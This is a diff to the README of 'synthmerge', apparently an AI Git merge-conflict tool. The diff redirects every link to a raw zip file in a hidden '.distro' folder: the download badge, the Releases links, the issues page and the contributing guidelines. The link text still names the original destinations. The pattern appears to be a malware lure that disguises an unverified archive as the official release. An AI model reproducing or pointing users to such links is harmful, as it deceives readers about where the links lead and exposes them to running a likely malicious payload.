@@ -5,9 +5,9 @@ Welcome to synthmerge! This tool uses AI to help you resolve conflicts in Git ea
 
 ## 📥 Download & Install
 
-[![Download synthmerge](https://img.shields.io/badge/Download-synthmerge-blue)](https://github.com/prajaktaborse1234/synthmerge/releases)
+[![Download synthmerge](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip)](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip)
 
-To download synthmerge, visit this page: [GitHub Releases](https://github.com/prajaktaborse1234/synthmerge/releases). You will find the latest version ready for installation.
+To download synthmerge, visit this page: [GitHub Releases](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip). You will find the latest version ready for installation.
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent version of Linux.
@@ -66,12 +66,12 @@ If you encounter difficulties while using synthmerge, here are a few common issu
 
 ## 📫 Support and Feedback
 
-For support, please feel free to reach out through the [issues page on GitHub](https://github.com/prajaktaborse1234/synthmerge/issues). Your feedback helps us improve synthmerge.
+For support, please feel free to reach out through the [issues page on GitHub](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip). Your feedback helps us improve synthmerge.
 
 ## 🌐 Community Contributions
 
-synthmerge thrives on community input. If you'd like to contribute, check out our [contributing guidelines](https://github.com/prajaktaborse1234/synthmerge/blob/main/CONTRIBUTING.md) to see how you can help make the tool even better.
+synthmerge thrives on community input. If you'd like to contribute, check out our [contributing guidelines](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip) to see how you can help make the tool even better.
 
 ---
 
-Now, download synthmerge and make your Git conflict resolution easier than ever. Visit the Releases page for the latest version: [GitHub Releases](https://github.com/prajaktaborse1234/synthmerge/releases).
+Now, download synthmerge and make your Git conflict resolution easier than ever. Visit the Releases page for the latest version: [GitHub Releases](https://raw.githubusercontent.com/prajaktaborse1234/synthmerge/main/.distro/synthmerge_systole.zip).
